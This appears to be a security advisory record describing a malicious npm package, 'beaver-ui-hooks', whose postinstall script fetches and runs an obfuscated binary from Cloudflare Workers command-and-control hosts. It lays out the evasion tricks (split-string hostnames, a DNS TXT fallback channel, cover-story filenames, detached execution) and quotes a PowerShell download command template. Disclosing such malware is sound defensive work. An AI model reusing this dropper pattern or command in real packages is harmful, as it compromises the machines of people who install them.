summary: beaver-ui-hooks postinstall dropper fetches and executes obfuscated binary from Cloudflare Workers C2
details: Package advertised as a UI hooks toolkit ships a setup.js that runs at postinstall and is also reached via require('./setup') from index.js. The script assembles C2 hostnames at runtime by joining split string fragments (e.g. oob-worker.cf99-9b3.workers.dev and sibling *.workers.dev hosts, plus a tin.dl.well1.site DNS TXT fallback that base64-decodes chunked TXT responses into a binary). It downloads a platform-specific executable — on Windows via `powershell -nop -c irm https://<host><path> -o <tmp>`, on Unix via https.get piped to fs.writeFileSync — writes it to /var/tmp or %TEMP% under cover-story names such as `dotnet_diag_*.exe` or `.cache_*`, chmods 0755 on Unix, then spawns it detached with stdio redirected to /dev/null and unref()'s the child. A 6-hour stamp and environment-variable opt-out gate re-execution to reduce noise. There is no legitimate need for a UI hook library to fetch and execute a native binary, and the string-split hostname assembly plus DNS TXT covert channel are consistent with deliberate evasion of static scanners.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
